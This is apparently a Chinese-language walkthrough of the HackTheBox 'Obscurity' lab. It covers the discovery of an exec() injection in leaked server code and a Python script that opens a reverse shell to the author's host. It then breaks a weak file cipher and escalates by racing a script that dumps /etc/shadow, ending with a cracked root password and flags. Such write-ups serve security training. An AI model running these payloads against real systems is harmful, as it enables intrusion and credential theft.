---
title: 'HTB Obscurity靶机实战'
date: 2020-02-05
updated: 2020-02-09
category: '渗透测试'
tags:
  - 'HTB'
  - '靶机'
lang: 'zh'
draft: false
---
## 信息收集

这里可以先设置一下hosts文件

```
10.10.10.168 obscure.htb
```

扫描端口发现开放了 `8080` 的web端口

页面提示有一个源码泄露

```
Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
```

那我们就需要爆破目录了

使用 `wfuzz`

```bash
sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
```

![](/posts/a0911a0b/1580912401299.png)

得到源码：

```python
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}

class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}

class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size) # 收到客户端的数据，应该就是数据包
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode()) # byte转str，返回的req是list
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"

        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
```

审计源码发现关键点：

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
        cwd = os.path.dirname(os.path.realpath(__file__))
        docRoot = os.path.join(cwd, docRoot)
```

大致说一下代码的含义，开启socket监听，接收到http请求，调用 `Request` 类的 `parseRequest` 方法做分割，然后调用 `handleRequest` 处理请求，通过 `serveDoc` 处理请求的文档

`exec` 函数处存在命令注入

```python
In [33]: path = "/';os.system('whoami')#"

In [34]: exec(info.format(path))
laptop-ubiep4k5\zz
```

然后就可以通过python反弹shell了

```python
import requests
import urllib
import os

url = 'http://10.10.10.168:8080/'

path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.146",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''

payload = urllib.parse.quote(path)
print("payload")
print(url+payload)

r= requests.get(url+payload)
print(r.headers)
print(r.text)
```

反弹到shell之后继续进行信息收集：

`check.txt`，大致含义就是加密了这个文件，加密的结果是 `out.txt`

```bash
www-data@obscure:/home/robert$ cat check.txt
cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

`out.txt`, 这个就是加密的结果

```
www-data@obscure:/home/robert$ xxd out.txt
xxd out.txt
00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
000000b0: c38c c397 c289 c281 76                   ........v
```

`passwordreminder.txt` 又是一个加密后的文件

```
www-data@obscure:/home/robert$ hd passwordreminder.txt
hd passwordreminder.txt
00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|
00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|
0000001b
```

`BetterSSH.py` (这个之后提权会用到)

```python
www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.py
cat BetterSSH.py
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

`SuperSecureCrypt.py`

```python
www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
cat SuperSecureCrypt.py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

从加密的脚本中可以知道关键的加密逻辑：

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted
```

所以我们只需要爆破密钥了

爆破脚本

```python
import string
with open('check.txt','r',encoding='UTF-8') as f:
    ta = f.read()
    
key=''
with open('out.txt','r',encoding='UTF-8') as f:
    data = f.read()
    for x in range(len(data)):
        for i in range(255):
            ch = chr((ord(data[x])-i)%255)
            if ch == ta[x]:
                key +=chr(i)
                break
    print(key)
```

得到密钥

```
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
```

> 这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 `python3 -m http.server 8001` 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的

将 xxd 得到的结果复制出来，然后我们可以通过`xxd -r` 反向 `dump` 出结果

```
robert@obscure:~$ xxd out.txt
00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
000000b0: c38c c397 c289 c281 76                   ........v
```

## user flag

得到密钥之后我们再解密即可

```bash
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d
k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/key.txt...
www-data@obscure:/home/robert$ cat /tmp/key.txt
cat /tmp/key.txt
SecThruObsFTW
```

成功登陆

拿到 flag

```bash
robert@obscure:~$ ls
BetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txt
robert@obscure:~$ cat user.txt
e4493782066b55fe2755708736ada2d7
```

## 提权

robert用户登陆之后，`sudo -l` 查看能够执行的root命令，发现能够以root身份执行 `BetterSSH.py`

```bash
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

审计源码发现关键点：

```python
with open('/etc/shadow', 'r') as f:
    data = f.readlines()
data = [(p.split(":") if "$" in p else None) for p in data]
passwords = []
for x in data:
    if not x == None:
        passwords.append(x)

passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
with open('/tmp/SSH/'+path, 'w') as f:
    f.write(passwordFile)
```

程序会将 `/etc/shadow` 写入到 `/tmp/SSH` 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可

```python
import shutil
import os
while True:
    files = os.listdir("./SSH")
    for file in files:
        shutil.copy(os.path.join("./SSH", file), "./flag");
```

或者使用 `shell` 脚本

```shell
robert@obscure:/tmp$ cat scandir.sh
#/bin/bash
path=$1
while (true); do
    file=$(ls $path)
    if [ "${file}" == "" ]
    then
        continue
    else
        mv $path/$file ./
        break
    fi
done
```

然后我们执行就会发现 `flag` 目录中存在文件

```python
robert@obscure:/tmp/flag$ ls
Tdrs5183
robert@obscure:/tmp/flag$ cat Tdrs5183
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

john 解密得到 `mercedes`

```bash
robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.py
Enter username: root
Enter password: mercedes
Authed!
root@Obscure$ ls
Output: SSH
systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtH
systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWi
vmware-root_574-2990744286

root@Obscure$ cat /root/root.txt
Output: 512fd4429f33a113a44d5acde23609e3
```

## 总结

做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间
